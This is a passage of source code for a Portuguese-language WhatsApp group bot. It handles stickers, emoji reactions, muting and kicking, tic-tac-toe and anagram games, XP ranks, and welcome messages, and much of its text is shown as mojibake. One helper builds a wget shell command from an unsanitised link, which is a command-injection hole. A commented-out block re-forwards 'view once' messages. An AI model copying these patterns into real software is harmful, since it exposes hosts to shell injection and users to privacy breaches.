leveloff: '‚ù¨ X ‚ù≠  *leveling* *desativado*',
levelnoton: '‚ù¨ X ‚ù≠ *leveling n√£o ativado*',
levelnol: '*error* 0 ¬∞-¬∞',
error: {
stick: '*falhou, tente novamente ^_^*',
Iv: 'Link invalido ‚òπÔ∏è'
},
msg: {
grupo: '[‚ùó] Este comando s√≥ pode ser usado em grupos! ‚ùå',
premium: '[‚ùó] ESTE PEDIDO √â SO PARA *USU√ÅRIOS PREMIUMS*',
mod: `[‚ùó] ESTE PEDIDO √â ESPEC√çFICO PARA USUARIO MOD ${global.NickDono}*`,
banido: '‚ùå Voc√™ foi banido de utilizar os comandos, entre em contato com o propriet√°rio pra saber o porque ‚ùå' ,
donosmt: '[‚ùó] Este √© um recurso especial para o propriet√°rio ‚ùå',
donosmt2: '[‚ùó] Este √© um recurso especial para o propriet√°rio ‚ùå',
adm: '[‚ùó] Este comando s√≥ pode ser usado por administradores de grupo! ‚ùå',
Badmin: ' [‚ùó] Este comando s√≥ pode ser usado quando o bot se torna administrador! ‚ùå',
}
}
//=====================================

const sendBtext = async (id, text1, desc1, but = [], vr) => {
buttonMessage = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
pl.sendMessage(id, buttonMessage, {quoted: vr})
}

//=====================================


const enviarbutao = (from, text, footer, buttons) => {
return pl.sendMessage(from, { text: text, footer: footer, templateButtons: buttons, quoted: m })
}    

//=====================================



const enviarimg = (imageDir, caption) => {
pl.sendMessage(from, {
image: fs.readFileSync(imageDir),
caption: caption
})
}

 
// ENVIAR BOT√ÉO COM IMAGEM
const sendBimg = async (id, img1, text1, desc1, but = [], vr) => {
buttonMessage = {
image: {url: img1},
caption: text1,
footer: desc1,
buttons: but,
headerType: 4
}
pl.sendMessage(id, buttonMessage, {quoted: vr})
}
   

//========AUTOFIGU-GP/AUTOFIGU-PV=============

const enviarfigu = async (figu, tag) => {
bla = fs.readFileSync(figu)
pl.sendMessage(from, {sticker: bla}, {quoted: info})
}

const enviarfiguUrl = async (link) => {
ranp = getRandom('.gif')
rano = getRandom('.webp')
ini_buffer = `${link}`
exec(`wget ${ini_buffer} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 320:320 ${rano}`, (err) => {
fs.unlinkSync(ranp)
buff = fs.readFileSync(rano)
pl.sendMessage(from, {sticker: buff}, {quoted: info}).catch(e => {
})
fs.unlinkSync(rano)
})
}

if(isAutoSticker &&  !m.key.fromMe && isGroup) {
async function autofiguf() {
await setTimeout(async() => {    
if(budy.includes(`${prefix}sticker`) || budy.includes(`${prefix}s`) || budy.includes(`${prefix}stk`) || budy.includes(`${prefix}st`) || budy.includes(`${prefix}fsticker`) || budy.includes(`${prefix}f`) || budy.includes(`${prefix}fstiker`)) return
if(type === "videoMessage") {
if ((isMedia && info.message.videoMessage.seconds < 40)){  
rane = getRandom('.'+await getExtension(info.message.videoMessage.mimetype))
buffimg = await getFileBuffer(info.message.videoMessage, 'video')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
await ffmpeg(`./${media}`)
.inputFormat(media.split('.')[1])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
exec(`webpmux -set exif ${addMetadata('bot', 'manu')} ${rano} -o ${rano}`, async (error) => {
fs.unlinkSync(media)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(`Falha na convers√£o de ${tipe} para sticker`)
})
})
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
pl.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})
} 
}

if(type === "imageMessage") {
rane = getRandom('.'+await getExtension(info.message.imageMessage.mimetype))
buffimg = await getFileBuffer(info.message.imageMessage, 'image')
fs.writeFileSync(rane, buffimg)
const media = rane
rano = getRandom('.webp')
exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
fs.unlinkSync(media)
buffer = fs.readFileSync(rano)
pl.sendMessage(from, {sticker: buffer}, {quoted: info})
fs.unlinkSync(rano)
})  
}
}, 1000)
}
autofiguf().catch(e => {
console.log(e)
})
}

/*

if (isGroup && !m.key.fromMe && type == 'viewOnceMessage') {
let teks = `„Äå *ANTI VIEWONCE ATIVADO * „Äç
    
    ü§† *NOME* : ${pushname}
    üëæ *USU√ÅRIO* : @${sender.split("@")[0]}
    ‚è∞ *Rel√≥gio* : ${moment.tz('America/Sao_Paulo').format('HH:mm:ss')}
    
    üí´ *MENSAGEM DENTRO* : ${type}`
reply(teks)
await sleep(500)
m.copyNForward(from, true, {
readViewOnce: true
}, {
quoted: mek
}).catch(_ => reply(`ERROOO`))
}

*/
//=====================================

/*
if (isAutoStick && isGroup) {
     if(type == "imageMessage") {
await pl.sendImageAsSticker(from, m,    {packname: global.packname, author: global.author })
console.log(`DETECTADO AUTOSTICKER `)
} else if(type == "videoMessage") {
await pl.sendVideoAsSticker(from, m,  {packname: global.packname, author: global.author })
}
}
*/

//=====================================

if(isAutoReact && isGroup && isCmd) {
if(!isAutoReact) return 
emojis = ["üòÄ", "üòÉ", "üòÅ", "üòÜ", "üòÇ", "ü§£", "üò≠", "üòâ", "üòò", "üòó", "ü•∞", "üòç", "ü§©", "ü•≥", "üôÉ", "üôÇ", "ü•≤", "üòã", "üòõ", "üòú", "üòù", "üòú", "üòá", "üòä", "‚ò∫Ô∏è", "üòè", "üòå", "üòî", "üòë", "üòê", "üò∂", "ü§î", "ü§´", "ü§≠", "ü•±", "ü§ó", "ü§®", "üßê", "üòí", "üôÑ", "üò§", "üò†", "ü§¨", "ü•∫", "üò•", "üòü", "‚òπÔ∏è", "üò¶", "üòß", "üò∞", "üò®", "üòï", "üòØ", "üò≤", "üò≥", "ü§Ø", "üò¨", "üòì", "üòì", "üòû", "üòñ", "ü•¥", "üòé", "ü§ì", "üòé", "ü•µ", "ü•∂", "üåû", "ü§¢", "ü§Æ", "ü§•", "ü§°", "üòà", "ü•µ", "üëΩ", "üò∑", "üí¶", "üë∫", "üëπ", "üí®", "üò∏", "üòπ", "‚ù§Ô∏è", "ü´Ä", "üëÅÔ∏è", "‚ò†Ô∏è", "üíÄ", "üëÄ", "üòª", "üíã", "ü´Ç", "üëÑ", "üëÖ", "üíÖ", "üôè", "ü§≥", "‚úçÔ∏è", "üôÖ", "üåÄ", "‚òÉÔ∏è", "üî•", "‚ö°", "üåà", "üíß", "üôà", "üçë", "üçí", "üçì", "üçå", "üå∂Ô∏è", "üçÜ", "üç¥", "üç∑", "üç¥", "üçΩÔ∏è", "üõ¢Ô∏è", "üö®", "üé§", "üé≠", "üìΩÔ∏è", "üé∞", "‚òéÔ∏è", "üìû", "üëë", "üíé", "üíç", "üíâ", "üóëÔ∏è", "üó°Ô∏è", "‚öîÔ∏è", "üö¨", "üí£", "‚ÅâÔ∏è", "‚úÖ", "üëÅÔ∏è‚Äçüó®Ô∏è", "‚ô•Ô∏è", "üß°", "üíõ", "üíö", "üíô", "üíú", "ü§é", "üñ§", "ü§ç", "üáßüá∑", "üè≥Ô∏è‚Äçüåà", "üá≤üáΩ", "üá™üá∏", "üá≤üáø", "üá¶üá¥", "üá∫üá≤","ü§î","ü§´","üòè","üçÜ","üë∫","üôä"]
reassao = emojis[Math.floor(Math.random() * emojis.length)]
sendMsg = await pl.sendMessage(from, {react: {text: reassao, key: m.key}})
}

if(isAutoReact && isGroup && !isCmd) {
if(!isAutoReact) return 
emojis = ["üòÄ", "üòÉ", "üòÅ", "üòÜ", "üòÇ", "ü§£", "üò≠", "üòâ", "üòò", "üòó", "ü•∞", "üòç", "ü§©", "ü•≥", "üôÉ", "üôÇ", "ü•≤", "üòã", "üòõ", "üòú", "üòù", "üòú", "üòá", "üòä", "‚ò∫Ô∏è", "üòè", "üòå", "üòî", "üòë", "üòê", "üò∂", "ü§î", "ü§´", "ü§≠", "ü•±", "ü§ó", "ü§®", "üßê", "üòí", "üôÑ", "üò§", "üò†", "ü§¨", "ü•∫", "üò•", "üòü", "‚òπÔ∏è", "üò¶", "üòß", "üò∞", "üò®", "üòï", "üòØ", "üò≤", "üò≥", "ü§Ø", "üò¨", "üòì", "üòì", "üòû", "üòñ", "ü•¥", "üòé", "ü§ì", "üòé", "ü•µ", "ü•∂", "üåû", "ü§¢", "ü§Æ", "ü§•", "ü§°", "üòà", "ü•µ", "üëΩ", "üò∑", "üí¶", "üë∫", "üëπ", "üí®", "üò∏", "üòπ", "‚ù§Ô∏è", "ü´Ä", "üëÅÔ∏è", "‚ò†Ô∏è", "üíÄ", "üëÄ", "üòª", "üíã", "ü´Ç", "üëÑ", "üëÖ", "üíÖ", "üôè", "ü§≥", "‚úçÔ∏è", "üôÖ", "üåÄ", "‚òÉÔ∏è", "üî•", "‚ö°", "üåà", "üíß", "üôà", "üçë", "üçí", "üçì", "üçå", "üå∂Ô∏è", "üçÜ", "üç¥", "üç∑", "üç¥", "üçΩÔ∏è", "üõ¢Ô∏è", "üö®", "üé§", "üé≠", "üìΩÔ∏è", "üé∞", "‚òéÔ∏è", "üìû", "üëë", "üíé", "üíç", "üíâ", "üóëÔ∏è", "üó°Ô∏è", "‚öîÔ∏è", "üö¨", "üí£", "‚ÅâÔ∏è", "‚úÖ", "üëÅÔ∏è‚Äçüó®Ô∏è", "‚ô•Ô∏è", "üß°", "üíõ", "üíö", "üíô", "üíú", "ü§é", "üñ§", "ü§ç", "üáßüá∑", "üè≥Ô∏è‚Äçüåà", "üá≤üáΩ", "üá™üá∏", "üá≤üáø", "üá¶üá¥", "üá∫üá≤","ü§î","ü§´","üòè","üçÜ","üë∫","üôä"]
reassao = emojis[Math.floor(Math.random() * emojis.length)]
sendMsg = await pl.sendMessage(from, {react: {text: reassao, key: m.key}})
}

const GroupsMutedActived = []
        for(let obj of muted) {
            GroupsMutedActived.push(obj.jid)
        }
        const isMuted = (isGroup && GroupsMutedActived.indexOf(from) >= 0) ? true : false
        const NumbersMuted = isMuted ? muted[GroupsMutedActived.indexOf(from)].numbers : []
        if(isMuted && NumbersMuted.indexOf(sender) >= 0){
        reply('*Eu avisei, vou meter o martelo do ban em tu üò° dsg√ß*')
        setTimeout(async () => {
            pl.groupParticipantsUpdate(from, [sender], 'remove')
        }, 1000)
return
}


//=====================================

//////////_FUN√á√ïES DO JOGO DA VELHA_//////
async function joguinhodavelha() {
if(joguinhodavelhajs2.includes(from) || joguinhodavelhajs.includes(sender)) {
const cmde = body.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
if (fs.existsSync(`./fun√ß√µes de cmd/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
if (body == "Cex") return reply("why");
if (
body.toLowerCase() == "s" ||
body.toLowerCase() == "sim" ||
body.toLowerCase() == "ok"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`O jogo j√° come√ßou antes!`);
const matrix = boardnow._matrix;
boardnow.status = true;
fs.writeFileSync(`./fun√ß√µes de cmd/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const chatAccept = `*üéÆ·èÄÃ∏·é™Ã∏·é∑Ã∏·é¨Ã∏ ·é†Ã∏·é™Ã∏ ·èôÃ∏·é¨Ã∏·èûÃ∏·éªÃ∏·é™Ã∏üïπÔ∏è*
    
‚ùå : @${boardnow.X}
‚≠ï : @${boardnow.O}
 
Sua vez... : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
pl.sendMessage(from, {text: chatAccept}, {quoted: m,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net", 
],
},
});
}
} else if (
body.toLowerCase() == "n" ||
body.toLowerCase() == "n√£o" ||
body.toLowerCase() == "no"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`O jogo j√° come√ßou!`);
fs.unlinkSync(`./fun√ß√µes de cmd/tictactoe/db/${from}.json`);
 pl.sendMessage(from, {text:
 `@${boardnow.X} *_Infelizmente seu oponente n√£o aceitou o desafio ‚ùåüòï_*`}, {quoted: m,
 contextInfo: {
 mentionedJid: [boardnow.X + "@s.whatsapp.net"],
},
}
);
joguinhodavelhajs.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}
}
}

if (arrNum.includes(cmde)) {
const boardnow = setGame(`${from}`);
if (!boardnow.status) return reply(`Parece que seu oponente n√£o aceitou o desafio ainda...`)
if (
(boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
     
sender.replace("@s.whatsapp.net", "")
)
return;
const moving = validmove(Number(body), `${from}`);
const matrix = moving._matrix;
if (moving.isWin) {
if (moving.winner == "SERI") {
const chatEqual = `*üéÆ·èÄÃ∏·é™Ã∏·é∑Ã∏·é¨Ã∏ ·é†Ã∏·é™Ã∏ ·èôÃ∏·é¨Ã∏·èûÃ∏·éªÃ∏·é™Ã∏üïπÔ∏è*
  
Jogo termina empatado üòê
`;
reply(chatEqual);
fs.unlinkSync(`./fun√ß√µes de cmd/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
return;
}
const abt = Math.ceil(Math.random() + 4000)
const winnerJID = moving.winner == "O" ? moving.O : moving.X;
const looseJID = moving.winner == "O" ? moving.X : moving.O;
const limWin = Math.floor(Math.random() * 1) + 10;
const limLoose = Math.floor(Math.random() * 1) + 5;
const chatWon = `*üéÆ·èÄÃ∏·é™Ã∏·é∑Ã∏·é¨Ã∏ ·é†Ã∏·é™Ã∏ ·èôÃ∏·é¨Ã∏·èûÃ∏·éªÃ∏·é™Ã∏üïπÔ∏è*
  
Vencido por @${winnerJID} üòéüëë
`;
addLevelingXp(winnerJID + "@s.whatsapp.net", abt)

pl.sendMessage(from, {text: chatWon}, {quoted: m,
contextInfo: {
mentionedJid: [
moving.winner == "O" ?
moving.O + "@s.whatsapp.net" :
moving.X + "@s.whatsapp.net",
],
},
});
setTimeout( () => {
if (fs.existsSync("./fun√ß√µes de cmd/tictactoe/db/" + from + ".json")) {
 fs.unlinkSync("./fun√ß√µes de cmd/tictactoe/db/" + from + ".json");
 reply(`*üïπÔ∏èJOGO DA VELHA RESETADO...üïπÔ∏è*`);
 } else {
console.log(color(time, "red"), color("[ ESPIRADO ]", "magenta"), color('Jogo da velha espirado', "red"));
 }
joguinhodavelhajs.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
}, 300000) //5 minutos
reply(`_*ü•≥Parab√©ns @${winnerJID} Voc√™ ganhou "${abt}" em xp por ter ganhado o jogo da velhaüéâ...*_`)      
fs.unlinkSync(`./fun√ß√µes de cmd/tictactoe/db/${from}.json`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs)) 
joguinhodavelhajs2.splice([])
fs.writeFileSync('./fun√ß√µes de cmd/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
const chatMove = `*üéÆ·èÄÃ∏·é™Ã∏·é∑Ã∏·é¨Ã∏ ·é†Ã∏·é™Ã∏ ·èôÃ∏·é¨Ã∏·èûÃ∏·éªÃ∏·é™Ã∏üïπÔ∏è*
  
‚ùå : @${moving.X}
‚≠ï : @${moving.O}

Sua vez : @${moving.turn == "X" ? moving.X : moving.O}

${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}
`;
pl.sendMessage(from, {text: chatMove}, {quoted: m,
contextInfo: {
mentionedJid: [
moving.X + "@s.whatsapp.net",
moving.O + "@s.whatsapp.net",
],
},
});
}
} 
} 
}

//===================================\\

		//JOGO DO ANAGRAM
if(isGroup && fs.existsSync(`./fun√ß√µes de cmd/anagrama-${from}.json`)){
let dataAnagrama = JSON.parse(fs.readFileSync(`./fun√ß√µes de cmd/anagrama-${from}.json`))
if(budy.slice(0,4).toUpperCase() == dataAnagrama.original.slice(0,4).toUpperCase() && budy.toUpperCase() != dataAnagrama.original) return reply('est√° perto')
xp = Math.floor(Math.random() * 14) + 3000
if(budy.toUpperCase() == dataAnagrama.original) { pl.sendMessage(from, {text: `parab√©ns ${pushname} ü•≥ voc√™ ganhou o jogo\nPalavra : ${dataAnagrama.original}\nIniciando o proximo jogo em 5 segundos...`}, {"mentionedJid": [sender]}), fs.unlinkSync(`./fun√ß√µes de cmd/anagrama-${from}.json`)		
addLevelingXp(sender, xp)
recompensa = `üéâüéâRECOMPENSAüéâüéâ\nVoc√™ ganhou ${xp} em *xp*`
reply(recompensa)
		setTimeout(async() => {
fs.writeFileSync(`./fun√ß√µes de cmd/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./fun√ß√µes de cmd/anagrama-${from}.json`))
pl.sendMessage(from, {text:`
‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚âΩ„Äå üëæ ANAGRAMA üëæ „Äç
‚îÇ‚ûΩ DESCUBRA A PALAVRA
‚îÇ‚ûΩ ANAGRAMA: ${dataAnagrama2.embaralhada}
‚îÇ‚ûΩ DICA: ${dataAnagrama2.dica}
‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
`}) 
}, 5000)
}}

var tipo = 'Membro comum'
if (SoDono) {
tipo = 'Meu DonoÔ∏è'
} 
if (isPremium) {
tipo = 'Vc √© premiumÔ∏è'
} 
if (isGroupAdmins) {
tipo = 'Ô∏èVc √© um Adm'
} 

//========================================\\

//=======FUNCIONALIDADE PATENTE=========\\
const nivelAtual = getLevelingLevel(sender)
var patt = 'Bronze I üö©'
if (nivelAtual === 1) {patt = 'Bronze  I üö©' } else if (nivelAtual === 2) {patt = 'Bronze II üö©'} else if (nivelAtual === 3) {patt = 'Bronze  III üö©'} else if (nivelAtual === 4) {patt = 'Bronze  IV  üö©'} else if (nivelAtual === 5) {patt = 'Bronze  V üö©'} else if (nivelAtual === 6) {patt = 'Prata Iü•à'} else if (nivelAtual === 7) {patt = 'Prata IIü•à'} else if (nivelAtual === 8) {patt = 'Prata IIIü•à'} else if (nivelAtual === 9) {patt = 'Prata IVü•à'} else if (nivelAtual === 10) {patt = 'Prata Vü•à'} else if (nivelAtual === 11) {patt = 'Ouro Iü•á'} else if (nivelAtual === 12) {patt = 'Ouro IIü•á'} else if (nivelAtual === 13) {patt = 'Ouro IIIü•á'} else if (nivelAtual === 14) {patt = 'Ouro IVü•á'} else if (nivelAtual === 15) {patt = 'Ouro Vü•á'} else if (nivelAtual === 16) {patt = 'Campe√£o IüèÜ'} else if (nivelAtual === 17) {patt = 'Campe√£o IIüèÜ'} else if (nivelAtual === 18) {patt = 'Campe√£o IIIüèÜ'} else if (nivelAtual === 19) {patt = 'Campe√£o IVüèÜ'} else if (nivelAtual === 20) {patt = 'Campe√£o VüèÜ'} else if (nivelAtual === 21) {patt = 'Diamante I üíé'} else if (nivelAtual === 22) {patt = 'Diamante II üíé'} else if (nivelAtual === 23) {patt = 'Diamante III üíé'} else if (nivelAtual === 24) {patt = 'Diamante IV üíé'} else if (nivelAtual === 25) {patt = 'Diamante V üíé'} else if (nivelAtual === 26) {patt = 'Mestre I üêÇ'} else if (nivelAtual === 27) {patt = 'Mestre II üêÇ'} else if (nivelAtual === 28) {patt = 'Mestre III üêÇ'} else if (nivelAtual === 29) {patt = 'Mestre IV üêÇ'} else if (nivelAtual === 30) {patt = 'Mestre V üêÇ'} else if (nivelAtual === 31) {patt = 'M√≠tico I üîÆ'} else if (nivelAtual === 32) {patt = 'M√≠tico II üîÆ'} else if (nivelAtual === 33) {patt = 'M√≠tico III üîÆ'} else if (nivelAtual === 34) {patt = 'M√≠tico IV üîÆ'} else if (nivelAtual === 35) {patt = 'M√≠tico V üîÆ'} else if (nivelAtual === 36) {patt = 'God Iüï¥'} else if (nivelAtual === 37) {patt = 'God IIüï¥'} else if (nivelAtual === 38) {patt = 'God IIIüï¥'} else if (nivelAtual === 39) {patt = 'God IVüï¥'} else if (nivelAtual === 40) {patt = 'God Vüï¥'} else if (nivelAtual > 41) {patt = 'üõêGrande Mestreüõê'}
//========================================\\

//==========(FUN√á√ÉO DE LEVEL)=============\\
if (isGroup && isLevelingOn) {
const currentLevel = getLevelingLevel(sender)
const checkId = getLevelingId(sender)
try {
if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
const amountXp = Math.floor(Math.random() * 10) + 500
const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
const getLevel = getLevelingLevel(sender)
addLevelingXp(sender, amountXp)
if (requiredXp <= getLevelingXp(sender)) {
addLevelingLevel(sender, 1)
await reply(`*‚ï≠‚îÅ‚îÄ‚îÅ‚îÄ‚îÄ‚îÄ‡º∫[üóØ]‡ºª‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‚îÄ‚îÅ‚ïÆ*
           *[üóØ] PARAB√âNS [üí´]*
*‚ï∞‚îÅ‚îÄ‚îÅ‚îÄ‚îÄ‚îÄ‡º∫[üí´]‡ºª‚îÄ‚îÄ‚îÄ‚îÄ‚îÅ‚îÄ‚îÅ‚ïØ*
[üí´] Parab√©ns, Voce subiu
[üí´] Continue subindo E Melhorando

*[üóØ] NOVO N√çVEL ALCAN√áADO [üí´]*

[üóØ] *CHAT:* ${sender.split("@")[0]}.           
[üóØ] *PATENTE*: ${patt}
[üóØ] *XP:* ${getLevelingXp(sender)}
[üóØ] *ANTIGO:* ${getLevel} 
[üóØ] *NEW LEVEL:* ${getLevelingLevel(sender)}`)}
} catch (err) {
console.error(err)
}
}

async function BemvindoFunc() {
pl.ev.on('group-participants.update', async (ale) => {
  
if(ale.participants[0].startsWith(pl.user.id.split(':')[0])) return 
const GroupMetadata_ = ale.id ? await pl.groupMetadata(ale.id): ""
  
const mdata_ = ale.id ? await pl.groupMetadata(ale.id): ""



// BEM VINDO COMPLETO 


if(welkom.includes(ale.id)) {
if(antifake.includes(ale.id) && !ale.participants[0].startsWith(55)) return
try {
  
// PEGAR DESCRI√á√ÉO DO GRUPO. 

const groupDesc = await GroupMetadata_.desc  
  
try {
ppimg = await pl.profilePictureUrl(ale.participants[0])
} catch {
ppimg = 'https://telegra.ph/file/b5427ea4b8701bc47e751.jpg'
}

try {
ppgp = await pl.profilePictureUrl(mdata_.id)
} catch {
ppgp = 'https://image.flaticon.com/icons/png/512/124/124034.png'
}

shortpc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppimg}`)
shortgc = await axios.get(`https://tinyurl.com/api-create.php?url=${ppgp}`)

const groupIdWelcomed = []
const groupIdBye = []
for(let obj of welcome_group) groupIdWelcomed.push(obj.id)
for(let obj of bye_group) groupIdBye.push(obj.id)


const isByed = groupIdBye.indexOf(ale.id) >= 0 ? true : false

const isWelcomed = (groupIdWelcomed.indexOf(ale.id) >= 0) ? true : false

if(ale.action === 'add') {
if(isWelcomed) {
var ind = groupIdWelcomed.indexOf(ale.id)
teks = welcome_group[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_.subject)
.replace('#numerodele#', '@'+ale.participants[0].split('@')[0])
.replace('#numerobot#', pl.user.id)
.replace('#prefixo#', prefix)
.replace('#descri√ß√£o#', groupDesc)
} else {
teks = welcome(ale.participants[0].split('@')[0], mdata_.subject)
}
let buff = await getBuffer(ppimg)
ran = getRandom('.jpg')
await fs.writeFileSync(ran, buff)

fs.unlinkSync(ran)
imgbuff = await getBuffer(`https://aleatoryapi.herokuapp.com/welcome?titulo=BEM%20VINDO(A)&nome=${ale.participants[0].split('@')[0]}&perfil=${shortpc.data}&fundo=${fundo1}&grupo=BEM VINDO AO GRUPO ${encodeUrl(mdata_.subject)}`)
pl.sendMessage(mdata_.id, {image: imgbuff, 
mentions: ale.participants, caption: teks})

} else if(ale.action === 'remove') {
mem = ale.participants[0]

try {
ppimg = await pl.profilePictureUrl(`${mem.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://telegra.ph/file/b5427ea4b8701bc47e751.jpg'
}


if(isByed) {
var ind = groupIdBye.indexOf(ale.id)
teks = bye_group[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_.subject)
.replace('#numerodele#', ale.participants[0].split('@')[0])
.replace('#numerobot#', pl.user.id)
.replace('#prefixo#', prefix)
.replace('#descri√ß√£o#', groupDesc)
} else {
teks = bye(ale.participants[0].split('@')[0])
}

let buff = await getBuffer(ppimg)
ran = getRandom('.jpg')
fs.writeFileSync(ran, buff)

imgbuff = await getBuffer(`https://aleatoryapi.herokuapp.com/welcome?titulo=Adeus&nome=${ale.participants[0].split('@')[0]}&perfil=${shortpc.data}&fundo=${fundo1}&grupo=SAIU DE ${encodeUrl(mdata_.subject)}`)
pl.sendMessage(mdata_.id, {image: imgbuff, caption: teks, 
mentions: ale.participants})
 fs.unlinkSync(ran)

}
} catch (e) {
if(String(e).includes("bye is not defined")) {
console.log(color(
`Mensagem de saiu do bem vindo n√£o definida, mas n√£o precisa definir,
qualquer d√∫vida d√∫vida digita :
${prefix}infobemvindo no WhatsApp..`, "yellow"))
} else if(String(e).includes("welcome is not defined")) {
console.log(color(
`Mensagem do bem vindo n√£o definida, qualquer d√∫vida digite : 
${prefix}infobemvindo no WhatsApp..`, "red"))
} else {
console.log(e);
}
}
}
})
// FIM ^


// BEM VINDO 2 ( SEM FOTO )

pl.ev.on('creds.update', saveState);
pl.ev.on('group-participants.update', async (ale) => {
  
if(ale.participants[0].startsWith(pl.user.id.split(':')[0])) return 
if(welkom2.includes(ale.id)) {
if(antifake.includes(ale.id) && !ale.participants[0].startsWith(55)) return
try {

const GroupMetadata_2 = ale.id ? await pl.groupMetadata(ale.id): ""
  
const mdata_2 = ale.id ? await pl.groupMetadata(ale.id): ""

// PEGAR DESCRI√á√ÉO DO GRUPO

const groupDesc = await GroupMetadata_2.desc

const groupIdWelcomed2 = []
const groupIdBye2 = []
for(let obj of welcome_group2) groupIdWelcomed2.push(obj.id)
for(let obj of bye_group2) groupIdBye2.push(obj.id)


const isByed2 = groupIdBye2.indexOf(ale.id) >= 0 ? true : false

const isWelcomed2 = (groupIdWelcomed2.indexOf(ale.id) >= 0) ? true : false

if(ale.action === 'add') {
if(isWelcomed2) {
var ind = groupIdWelcomed2.indexOf(ale.id)
teks = welcome_group2[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_2.subject)
.replace('#numerodele#', '@'+ale.participants[0].split('@')[0])
.replace('#numerobot#', pl.user.id)
.replace('#prefixo#', prefix)
.replace('#descri√ß√£o#', groupDesc)
} else {
teks = welcome(ale.participants[0].split('@')[0], mdata_2.subject)
}

pl.sendMessage(mdata_2.id, {text: teks}, {mentions: ale.participants})

} else if(ale.action === 'remove') {
mem = ale.participants[0]

if(isByed2) {
var ind = groupIdBye2.indexOf(ale.id)
teks = bye_group2[ind].msg
.replace('#hora#', time)
.replace('#nomedogp#', mdata_2.subject)
.replace('#numerodele#', ale.participants[0].split('@')[0])
.replace('#numerobot#', pl.user.id)
.replace('#prefixo#', prefix)
.replace('#descri√ß√£o#', groupDesc)
} else {
teks = bye(ale.participants[0].split('@')[0])
}

pl.sendMessage(mdata_2.id, {text: teks}, {mentions: ale.participants})
 fs.unlinkSync(ran)
}
} catch (e) {
if(String(e).includes("bye is not defined")) {
console.log(color(
`Mensagem de saiu do bem vindo n√£o definida, mas
n√£o precisa definir, qualquer d√∫vida digita :
${prefix}infobemvindo no WhatsApp..`, "yellow"))
} else if(String(e).includes("welcome is not defined")) {
console.log(color(
`Mensagem do bem vindo n√£o definida, qualquer d√∫vida digite :
${prefix}infobemvindo no WhatsApp..`, "red"))
} else {
console.log(e);
}
}
}
})

}

BemvindoFunc().catch(e => {
console.log(e+"BVND")
})

// FIM BEM VINDO (2)
//=======================================\\

//===============(simih)=============\\
const simih = async (text) => {
	try {
		const sami = await fetch(`https://api.brizaloka-api.tk/ia/simsimi?apikey=brizaloka&text=${text}`, {method: 'GET'})
		const res = await sami.json()
		return res.resultado.resposta
	} catch {
		return 'Simi n√£o sabe, pfvr explique ??'
	}
}


async function AntilinkHardF() {
